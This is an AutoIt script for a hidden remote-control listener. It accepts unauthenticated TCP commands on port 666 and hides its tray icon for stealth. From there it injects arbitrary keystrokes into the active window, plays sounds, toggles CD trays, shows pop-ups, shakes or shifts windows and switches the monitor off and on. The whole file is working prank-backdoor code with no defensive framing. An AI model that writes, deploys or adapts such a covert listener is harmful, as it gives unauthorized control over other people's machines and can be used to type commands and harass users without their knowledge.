TCPStartup()

$ipAddress = @IPAddress1
$portAddress = 666
MsgBox ( 4096, "Rokken like Dokken", "Listening on IP: " & $ipAddress & " and PORT: " & $portAddress, 5 )

;HotKeySet("`","goAway")
; hide the try icon... it's more stealthier that way...
Opt("TrayIconHide", 1) 


$MainSocket = TCPListen($ipAddress, $portAddress)

$cdStatus = "open"
$driveArray = DriveGetDrive("CDROM")

While 1
  Do
    $ConnectedSocket = TCPAccept($MainSocket)
  Until $ConnectedSocket > 0
  
  $err = 0
  Do
    $msg = TCPRecv($ConnectedSocket,512)
    $err = @error
    If StringLen($msg) THEN
      ;trayTip("server",$msg, 30)
      
      ; go through the various messages to process them accordingly...
      
      ; sounds being sent...
      if StringInStr ( $msg, "SOUNDSEND:") THEN
        $sndFile = "                                   " & StringReplace ( $msg, "SOUNDSEND:", "") & ".mp3"
        ;trayTip("server",$sndFile, 30)
        SoundSetWaveVolume (100); turn up the volume
        SoundPlay ($sndFile, 0); play the sound!
      endIf
      
      ; text being sent to keyboards...
      if StringInStr ( $msg, "KEYBOARDSEND:") THEN
        $keyboardSendText = StringReplace ( $msg, "KEYBOARDSEND:", "")
        Send ($keyboardSendText, 1)
      endIf
      
      ; mess with the cd drives a bit...
      if StringInStr ($msg, "OPENCLOSECD:") THEN  
        For $i = 1 to $driveArray[0]
          CDTray ( $driveArray[$i], $cdStatus)
        Next
        if $cdStatus = "open" THEN
          $cdStatus = "closed"
        else
          $cdStatus = "open"
        endIf 
      endIf
      
      ; alert box!!!
      if StringInStr ( $msg, "ALERTBOX:") THEN
        $alertBoxText = StringReplace ( $msg, "ALERTBOX:", "")
        MsgBox ( 4096, "", $alertBoxText, 5 )
      endIf
      
      ; window shake
      if StringInStr ( $msg, "WINDOWSHAKE:") THEN
        windowShake()
      endIf
      
      ; screen flicker
      if StringInStr ( $msg, "SCREENFLICKER:") THEN
        screenFlicker()
      endIf
      
      ; move left
      if StringInStr ( $msg, "MOVELEFT:") THEN
        moveLeft()
      endIf
      
      ; move right
      if StringInStr ( $msg, "MOVERIGHT:") THEN
        moveRight()
      endIf
      
      
      if StringInStr ( $msg, "EXIT:") THEN
        goAway()
      endIf
      
    endIf
  
  Until $err
    TCPCloseSocket($ConnectedSocket)
WEnd
; end of the main loop


func goAway()
  TCPShutdown()
  Exit
endFunc


func windowShake()
  ; script to shake the current window...
  $windowArray = WinList()
  
  ; set up some of the shake parameters
  $numShakes = 30
  $shakeIntensity = 10
  $shakeDelay = 20
  
  For $i = 1 to $windowArray[0][0]
    ; loop through to find the active window... and shake it...
    If $windowArray[$i][0] <> "" AND isVisible($windowArray[$i][1]) And winActive($windowArray[$i][0]) Then
      $posArray = WinGetPos($windowArray[$i][0])
      ; shake it like a salt shaka
      For $x = 1 to $numShakes
        if Random(0,1) = 1 then $shakeIntensity = $shakeIntensity * -1
        WinMove ( $windowArray[$i][0], "", $posArray[0]+$shakeIntensity, $posArray[1]+$shakeIntensity)
        sleep(10)
        WinMove ( $windowArray[$i][0], "", $posArray[0], $posArray[1])
      Next
    EndIf
  Next
endFunc


func screenFlicker()
  Opt("WinTitleMatchMode", 4)
  $WM_SYSCommand = 274
  $SC_MonitorPower = 61808
  $Power_On = -1
  $Power_Off = 2
  $X = 1
  $HWND = WinGetHandle("classname=Progman")
  DllCall("user32.dll", "int", "SendMessage", "hwnd", $HWND, "int", $WM_SYSCommand, "int", $SC_MonitorPower, "int", $Power_Off)
  DllCall("user32.dll", "int", "SendMessage", "hwnd", $HWND, "int", $WM_SYSCommand, "int", $SC_MonitorPower, "int", $Power_On)
endFunc


func moveLeft()
  ; set a parameter
  $numPixelsToMove = 5
  
  $windowArray = WinList()
  For $i = 1 to $windowArray[0][0]
    If $windowArray[$i][0] <> "" AND IsVisible($windowArray[$i][1]) Then
      $posArray = WinGetPos($windowArray[$i][0])
      WinMove ( $windowArray[$i][0], "", $posArray[0]-$numPixelsToMove,   $posArray[1])
    EndIf
  Next
endFunc


func moveRight()
  ; set a parameter
  $numPixelsToMove = 5

  $windowArray = WinList()
  For $i = 1 to $windowArray[0][0]
    If $windowArray[$i][0] <> "" AND IsVisible($windowArray[$i][1]) Then
      $posArray = WinGetPos($windowArray[$i][0])
      WinMove ( $windowArray[$i][0], "", $posArray[0]+$numPixelsToMove,   $posArray[1])
    EndIf
  Next
endFunc

func isVisible($handle)
  If BitAnd( WinGetState($handle), 2 ) Then 
    Return 1
  Else
    Return 0
  EndIf
EndFunc
